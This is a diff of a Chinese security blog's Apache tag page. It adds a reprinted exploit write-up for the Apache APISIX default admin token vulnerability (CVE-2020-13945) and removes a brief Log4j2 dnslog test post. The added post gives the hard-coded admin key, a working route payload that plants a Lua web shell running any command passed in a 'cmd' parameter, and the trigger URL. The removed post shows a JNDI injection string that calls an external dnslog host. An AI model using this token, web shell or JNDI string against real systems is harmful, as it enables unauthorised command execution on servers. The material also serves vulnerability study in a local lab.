+                Apache APISIX 默认密钥漏洞（CVE-2020-13945）
+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="apache-apisix-默认密钥漏洞cve-2020-13945">Apache APISIX 默认密钥漏洞（CVE-2020-13945）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/horistttt/article/details/124344871">horisMMM</a> 并作补充</p>
+</blockquote>
+<h2><span id="apisix简介">APISIX简介</span></h2><blockquote>
+<p>官方一句话介绍：Apache APISIX是一个高性能API网关。</p>
+<p>API网关又是什么？</p>
+<p>百度：API网关，软件术语，两个相互独立的局域网之间通过路由器进行通信，中间的路由被称之为网关。</p>
+<p>任何一个应用系统如果需要被其他系统调用，就需要暴露 API，这些 API 代表着一个一个的功能点。</p>
+<p>如果两个系统中间通信，在系统之间加上一个中介者协助 API 的调用，这个中介者就是 API 网关。</p>
+<p>那意思就是Apisix是两个系统的一个中介，可以使用这个中间管理系统API。</p>
+</blockquote>
+<h2><span id="存在漏洞">存在漏洞</span></h2><blockquote>
+<p>在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token edd1c9f034335f136f87ad84b625c8f1，攻击者利用这个Token可以访问到管理员接口，进而通过script参数来插入任意LUA脚本并执行。</p>
+<p>意思就是有一个默认的Token，可以直接得到管理员权限，并插入攻击脚本。</p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
+<p>docker-compose up -d 搭建环境</p>
+<p>docker ps 查看端口为9080</p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/1.png" alt="image"></p>
+<p>访问 127.0.0.1&#x2F;asixpix&#x2F;admin&#x2F;routes,显示token不正确</p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/2.png" alt="image"></p>
+<p>抓这个包，把方法改为POST，加上X-API-KEY: edd1c9f034335f136f87ad84b625c8f1，加上payload</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;uri&quot;: &quot;/attack&quot;,</span><br><span class="line">&quot;script&quot;: &quot;local _M = &#123;&#125; \n function _M.access(conf, ctx) \n local os = require(&#x27;os&#x27;)\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, &#x27;r&#x27;))\n local s = assert(f:read(&#x27;*a&#x27;))\n ngx.say(s)\n f:close()  \n end \nreturn _M&quot;,</span><br><span class="line">    &quot;upstream&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;roundrobin&quot;,</span><br><span class="line">        &quot;nodes&quot;: &#123;</span><br><span class="line">            &quot;example.com:80&quot;: 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/3.png" alt="image"></p>
+<p>然后，我们访问刚才添加的router，就可以通过cmd参数执行任意命令：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9080/attack?cmd=id</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/4.png" alt="image"></p>
+</blockquote>
+<h2><span id="payload分析">payload分析</span></h2><blockquote>
+<p>查看官方文档，观察创建路由的方法</p>
+<p><a target="_blank" rel="noopener" href="https://apisix.apache.org/zh/docs/apisix/getting-started/">https://apisix.apache.org/zh/docs/apisix/getting-started/</a></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/5.png" alt="image"></p>
+<p>与payload对比，发现payload格式与官方创建路由一致，只是利用script插入了一段lua恶意脚本。</p>
+<p>在 Apache APISIX 中，我们在 Route 实体中新增了 script 执行逻辑，可用于接收 Dashboard 生成的 Lua 函数并执行，它支持调用已有插件以复用代码。另外，它也作用于 HTTP 请求的生命周期中的各个阶段，如 access、header_filer、body_filter 等，系统会在相应阶段自动执行 script 函数对应阶段代码<br><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/6.png" alt="image"></p>
+<p>接下来对lua脚本进行分析,\n是换行</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> _M = &#123;&#125; \n <span class="function"><span class="keyword">function</span> <span class="title">_M.access</span><span class="params">(conf, ctx)</span></span>//在access阶段进行处理，检查如果达到的不健康次数超过了配置的最大次数，则就被<span class="keyword">break</span>掉。这里没找到看得懂的资料。</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">os</span> = <span class="built_in">require</span>(<span class="string">&#x27;os&#x27;</span>)//加载<span class="built_in">os</span>模块，用于进行文件操作</span><br><span class="line"><span class="keyword">local</span> args = <span class="built_in">assert</span>(ngx.req.get_uri_args()) //<span class="built_in">assert</span>()是断言，类似于try(),这里是获取uri中给的参数。</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">assert</span>(<span class="built_in">io</span>.<span class="built_in">popen</span>(args.cmd, <span class="string">&#x27;r&#x27;</span>))//<span class="built_in">io</span>.<span class="built_in">popen</span>()用于执行系统命令,<span class="string">&#x27;r&#x27;</span>是模式</span><br><span class="line"><span class="keyword">local</span> s = <span class="built_in">assert</span>(f:<span class="built_in">read</span>(<span class="string">&#x27;*a&#x27;</span>))//读取全部内容</span><br><span class="line">ngx.say(s)//输出，还有一种方法是ngx.<span class="built_in">print</span>(),但两者有区别</span><br><span class="line">f:<span class="built_in">close</span>()</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"><span class="keyword">return</span> _M</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>function _M.access(conf, ctx)</strong></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/7.png" alt="image"></p>
+<p><strong>assert()</strong></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/8.png" alt="image"></p>
+<p><strong>read(‘a’)</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013625451/article/details/78879739">https://blog.csdn.net/u013625451/article/details/78879739</a></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/9.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/11/07/CVE-2016-4437-Apache-Shiro/">
                 Apache Shiro 默认密钥致命令执行漏洞（CVE-2016-4437）
             </a>
@@ -492,7 +1075,7 @@
 
         
             <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/RCE-Exploit/" rel="tag">RCE - Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/RocketMQ/" rel="tag">RocketMQ</a>
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
@@ -611,46 +1194,7 @@
 
         
             <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Shiro/" rel="tag">Shiro</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/03/dnslog-log4j2/">
-                dnslog-log4j2
-            </a>
-        </h2>
-    
-    <time>
-        Aug 3, 2022
-    </time>
-    <section class="content">
-        <h1><span id="dnslog简单验证log4j2漏洞">dnslog简单验证log4j2漏洞</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://xingye.me/?p=444">星夜</a></p>
-</blockquote>
-<h2><span id="简单步骤">简单步骤</span></h2><blockquote>
-<p>进dnslog：<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>
-<p>Get SubDomain 得到一个随机的子域名</p>
-<p>拼进${jndi:ldap:&#x2F;&#x2F;xxxxx.dnslog.cn&#x2F;exp}</p>
-<p>往任意可能在log中塞的输入填</p>
-<p>这里拿tx玩，如群中发送，可得到tx云的记录</p>
-<p><img src="/2022/08/03/dnslog-log4j2/1.png" alt="image"></p>
-<p><img src="/2022/08/03/dnslog-log4j2/2.png" alt="image"></p>
-<p><img src="/2022/08/03/dnslog-log4j2/3.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Log4j2/" rel="tag">Log4j2</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
@@ -659,6 +1203,16 @@
   
 </section>
 
+
+  <nav id="page-nav" class="clearfix">
+    
+    
+    <a class="next" rel="next" href="/tags/Apache/page/2/">
+      <span class="text">Next</span>
+      <span class="icon icon-chevron-right"></span>
+    </a>
+    
+  </nav>
 
         <script>setLoadingBarProgress(60);</script>
     </main>
